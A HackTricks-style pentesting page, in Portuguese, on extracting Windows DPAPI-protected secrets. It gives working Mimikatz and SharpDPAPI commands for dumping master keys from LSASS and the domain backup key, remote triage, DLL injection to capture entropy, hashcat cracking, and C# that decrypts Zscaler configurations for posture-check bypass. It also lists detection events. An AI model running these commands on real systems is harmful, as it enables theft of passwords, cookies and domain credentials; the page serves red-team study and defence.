# DPAPI - Extraindo Senhas

{{#include ../../banners/hacktricks-training.md}}



## O que é o DPAPI

The Data Protection API (DPAPI) é utilizada principalmente no sistema operacional Windows para a **encryptação simétrica de chaves privadas assimétricas**, aproveitando segredos do usuário ou do sistema como uma fonte significativa de entropia. Essa abordagem simplifica a encryptação para desenvolvedores, permitindo que eles encryptem dados usando uma chave derivada dos segredos de logon do usuário ou, para encryptação do sistema, dos segredos de autenticação do domínio, eliminando a necessidade de os desenvolvedores gerenciarem a proteção da chave de encryptação por conta própria.

A maneira mais comum de usar o DPAPI é através das funções **`CryptProtectData` e `CryptUnprotectData`**, que permitem que aplicações encryptem e decryptem dados de forma segura com a sessão do processo que está atualmente logado. Isso significa que os dados encryptados só podem ser decrypted pelo mesmo usuário ou sistema que os encrypted.

Além disso, essas funções aceitam também um **`entropy` parameter** que será usado durante a encryptação e decryptação; portanto, para decryptar algo encryptado usando esse parâmetro, você deve fornecer o mesmo valor de entropy que foi usado durante a encryptação.

### Geração da chave do usuário

O DPAPI gera uma chave única (chamada **`pre-key`**) para cada usuário com base em suas credenciais. Essa chave é derivada da senha do usuário e de outros fatores e o algoritmo depende do tipo de usuário, mas acaba sendo um SHA1. Por exemplo, para usuários de domínio, **depende do NTLM hash do usuário**.

Isso é especialmente interessante porque, se um atacante conseguir obter o hash da senha do usuário, ele pode:

- **Decryptar qualquer dado que foi encryptado usando DPAPI** com a chave desse usuário sem precisar contatar qualquer API
- Tentar **crackear a senha** offline tentando gerar a chave DPAPI válida

Além disso, toda vez que alguns dados são encryptados por um usuário usando DPAPI, uma nova **master key** é gerada. Essa master key é a que realmente é usada para encryptar os dados. Cada master key é identificada por um **GUID** (Globally Unique Identifier).

As master keys são armazenadas no diretório **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, onde `{SID}` é o Security Identifier desse usuário. A master key é armazenada encryptada pela **`pre-key`** do usuário e também por uma **domain backup key** para recuperação (então a mesma chave é armazenada encryptada 2 vezes por 2 caminhos diferentes).

Note que a **domain key usada para encryptar a master key está nos domain controllers e nunca muda**, então se um atacante tem acesso ao domain controller, ele pode recuperar a domain backup key e decryptar as master keys de todos os usuários do domínio.

Os blobs encryptados contém o **GUID da master key** que foi usada para encryptar os dados dentro dos seus headers.

> [!TIP]
> DPAPI encrypted blobs começam com **`01 00 00 00`**

Encontrar master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Geração da chave Machine/System

Esta é a chave usada pela máquina para criptografar dados. É baseada no **DPAPI_SYSTEM LSA secret**, que é uma chave especial que somente o usuário SYSTEM pode acessar. Esta chave é usada para criptografar dados que precisam ser acessíveis pelo próprio sistema, como credenciais em nível de máquina ou segredos de todo o sistema.

Observe que essas chaves **não têm um domain backup** e, portanto, são acessíveis apenas localmente:

- **Mimikatz** pode acessá-la extraindo os LSA secrets usando o comando: `mimikatz lsadump::secrets`
- O segredo é armazenado no registro, então um administrador poderia **modificar as permissões DACL para acessá-lo**. O caminho do registro é: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Dados protegidos pelo DPAPI

Entre os dados pessoais protegidos pelo DPAPI estão:

- Credenciais do Windows
- Senhas do Internet Explorer e do Google Chrome e dados de auto-completação
- Senhas de contas de e-mail e de FTP interno para aplicações como Outlook e Windows Mail
- Senhas para pastas compartilhadas, recursos, redes wireless e Windows Vault, incluindo chaves de criptografia
- Senhas para conexões de remote desktop, .NET Passport e chaves privadas para vários fins de criptografia e autenticação
- Senhas de rede gerenciadas pelo Credential Manager e dados pessoais em aplicações que usam CryptProtectData, como Skype, MSN messenger, e mais
- Blobs criptografados dentro do registro
- ...

Dados protegidos pelo sistema incluem:
- Senhas de Wi-Fi
- Senhas de tarefas agendadas
- ...

### Master key extraction options

- Se o usuário tiver privilégios de domain admin, ele pode acessar a **domain backup key** para descriptografar todas as master keys de usuário no domínio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Com privilégios de administrador local, é possível **acessar a memória do LSASS** para extrair as DPAPI master keys de todos os usuários conectados e a SYSTEM key.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Se o usuário tiver privilégios de administrador local, ele pode acessar o **DPAPI_SYSTEM LSA secret** para descriptografar as chaves mestres da máquina:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Se a senha ou o hash NTLM do usuário for conhecido, você pode **descriptografar as master keys do usuário diretamente**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Se você estiver numa sessão como o usuário, é possível solicitar ao DC a **backup key to decrypt the master keys using RPC**. Se você for administrador local e o usuário estiver logado, você poderia **steal his session token** para isto:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Listar Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Acessar DPAPI Encrypted Data

### Encontrar dados criptografados por DPAPI

Arquivos de usuários comuns **protegidos** estão em:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Check also changing `\Roaming\` to `\Local\` in the above paths.

Exemplos de enumeração:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) pode encontrar DPAPI encrypted blobs no file system, registry e B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Observe que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (do mesmo repositório) pode ser usado para descriptografar, usando DPAPI, dados sensíveis como cookies.

### Chaves de acesso e dados

- **Use SharpDPAPI** para obter credenciais de arquivos criptografados com DPAPI da sessão atual:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obter informações das credenciais** como os dados criptografados e o guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Acessar masterkeys**:

Descriptografar um masterkey de um usuário que solicita a **domain backup key** usando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
A ferramenta **SharpDPAPI** também suporta estes argumentos para descriptografia da masterkey (observe como é possível usar `/rpc` para obter a chave de backup do domínio, `/password` para usar uma senha em texto simples, ou `/pvk` para especificar um arquivo de chave privada de domínio DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Descriptografar dados usando uma masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
A ferramenta **SharpDPAPI** também suporta esses argumentos para descriptografia de `credentials|vaults|rdg|keepass|triage|blob|ps` (observe como é possível usar `/rpc` para obter a chave de backup do domínio, `/password` para usar uma senha em texto claro, `/pvk` para especificar um arquivo de chave privada de domínio DPAPI, `/unprotect` para usar a sessão do usuário atual...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Descriptografar alguns dados usando **sessão do usuário atual**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Tratando Entropia Opcional ("Entropia de terceiros")

Algumas aplicações passam um valor adicional de **entropia** para `CryptProtectData`. Sem esse valor o blob não pode ser descriptografado, mesmo que a **masterkey** correta seja conhecida. Obter a entropia é, portanto, essencial ao visar credenciais protegidas dessa forma (por exemplo, Microsoft Outlook, alguns clientes VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) é uma DLL em modo usuário que intercepta as funções DPAPI dentro do processo alvo e registra de forma transparente qualquer entropia opcional fornecida. Executar EntropyCapture no modo **DLL-injection** contra processos como `outlook.exe` ou `vpnclient.exe` irá gerar um arquivo mapeando cada buffer de entropia para o processo chamador e o blob. A entropia capturada pode depois ser fornecida ao **SharpDPAPI** (`/entropy:`) ou ao **Mimikatz** (`/entropy:<file>`) para descriptografar os dados.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Quebrando masterkeys offline (Hashcat & DPAPISnoop)

A Microsoft introduziu um formato de masterkey **context 3** a partir do Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) adicionou os hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) e **22102** (context 3), permitindo cracking acelerado por GPU de senhas de usuário diretamente do arquivo masterkey. Portanto, atacantes podem realizar ataques word-list ou brute-force sem interagir com o sistema alvo.

`DPAPISnoop` (2024) automatiza o processo:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
A ferramenta também pode analisar blobs de Credential e Vault, decifrá-los com chaves quebradas e exportar senhas em texto claro.

### Acessar dados de outra máquina

Em **SharpDPAPI e SharpChrome** você pode indicar a opção **`/server:HOST`** para acessar os dados de uma máquina remota. Claro que você precisa conseguir acessar essa máquina e, no exemplo a seguir, supõe-se que a **chave de criptografia de backup do domínio é conhecida**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Outras ferramentas

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) é uma ferramenta que automatiza a extração de todos os usuários e computadores do diretório LDAP e a extração da chave de backup do domain controller via RPC. O script então resolverá o endereço IP de todos os computadores e executará um smbclient em todos os computadores para recuperar todos os blobs DPAPI de todos os usuários e descriptografar tudo com a chave de backup do domínio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Com a lista de computadores extraída do LDAP você pode encontrar todas as sub-redes mesmo que não as conhecesse!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) pode extrair segredos protegidos por DPAPI automaticamente. O lançamento 2.x introduziu:

* Coleta paralela de blobs a partir de centenas de hosts
* Parsing de **context 3** masterkeys e integração automática com cracking via Hashcat
* Suporte para cookies criptografados do Chrome "App-Bound" (veja a próxima seção)
* Um novo modo **`--snapshot`** para sondar repetidamente endpoints e comparar blobs recém-criados

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) é um parser em C# para arquivos masterkey/credential/vault que pode gerar formatos para Hashcat/JtR e opcionalmente invocar o cracking automaticamente. Suporta completamente os formatos de masterkey de máquina e usuário até o Windows 11 24H1.


## Detecções comuns

- Acesso a arquivos em `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` e outros diretórios relacionados ao DPAPI.
- Especialmente a partir de um compartilhamento de rede como **C$** ou **ADMIN$**.
- Uso de **Mimikatz**, **SharpDPAPI** ou ferramentas similares para acessar a memória do LSASS ou extrair masterkeys.
- Evento **4662**: *Uma operação foi realizada em um objeto* – pode ser correlacionado com acesso ao objeto **`BCKUPKEY`**.
- Eventos **4673/4674** quando um processo solicita *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilidades e mudanças no ecossistema 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembro de 2023). Um atacante com acesso à rede poderia enganar um membro do domínio para recuperar uma chave de backup DPAPI maliciosa, permitindo a descriptografia dos masterkeys de usuários. Corrigido no cumulative update de novembro de 2023 – os administradores devem garantir que os DCs e estações de trabalho estejam totalmente atualizados.
* **Chrome 127 “App-Bound” cookie encryption** (julho de 2024) substituiu a proteção legada somente por DPAPI por uma chave adicional armazenada no **Credential Manager** do usuário. A descriptografia offline de cookies agora requer tanto o masterkey DPAPI quanto a **GCM-wrapped app-bound key**. SharpChrome v2.3 e DonPAPI 2.x são capazes de recuperar a chave extra quando executados com contexto de usuário.


### Estudo de caso: Zscaler Client Connector – Entropia personalizada derivada do SID

Zscaler Client Connector armazena vários arquivos de configuração em `C:\ProgramData\Zscaler` (por exemplo `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Cada arquivo é criptografado com **DPAPI (Machine scope)**, mas o fornecedor fornece **entropia personalizada** que é *calculada em tempo de execução* em vez de ser armazenada em disco.

A entropia é reconstruída a partir de dois elementos:

1. Um segredo hard-coded embutido em `ZSACredentialProvider.dll`.
2. O **SID** da conta Windows à qual a configuração pertence.

O algoritmo implementado pela DLL é equivalente a:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Porque o segredo está embutido em uma DLL que pode ser lida do disco, **qualquer atacante local com direitos SYSTEM pode regenerar a entropia para qualquer SID** e descriptografar os blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
A decriptação revela a configuração JSON completa, incluindo cada **verificação de postura do dispositivo** e seu valor esperado — informação muito valiosa ao tentar bypasses do lado do cliente.

> DICA: os outros artefatos criptografados (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) são protegidos com DPAPI **sem** entropia (`16` zero bytes). Eles podem, portanto, ser decifrados diretamente com `ProtectedData.Unprotect` assim que privilégios SYSTEM forem obtidos.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
